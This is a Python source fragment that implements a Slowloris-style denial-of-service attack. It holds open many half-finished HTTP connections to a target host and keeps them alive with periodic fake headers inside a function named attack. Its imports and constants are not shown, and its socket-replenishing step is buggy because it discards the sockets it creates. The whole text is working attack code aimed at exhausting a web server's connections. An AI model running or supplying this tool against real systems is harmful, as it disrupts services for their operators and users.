def init_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, 80))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 5000)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))

    return s


def create_sockets(count=SOCKETS_COUNT):
    sockets = []

    for _ in range(count):
        try:
            s = init_socket()
        except socket.error as e:
            logging.debug(e)
            break
        sockets.append(s)
    
    return sockets


def attack(sockets):
    logging.debug("Attacking %s, sockets: %s", HOST, sockets)

    while True:
        try:
            logging.debug(
                "Sending keep-alive headers... Sockets count: %s", len(sockets)
            )
            
            for s in sockets:
                try:
                    s.send(
                        "X-head: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
                    )
                except socket.error:
                    sockets.remove(s)

            dead_sockets_count = SOCKETS_COUNT - len(sockets)
            create_sockets(dead_sockets_count)

            logging.debug("Sleeping for 10 seconds")
            time.sleep(10)

        except (KeyboardInterrupt, SystemExit):
            logging.debug("Stopping....")
            break


if __name__ == "__main__":
    sockets = create_sockets()
    attack(sockets)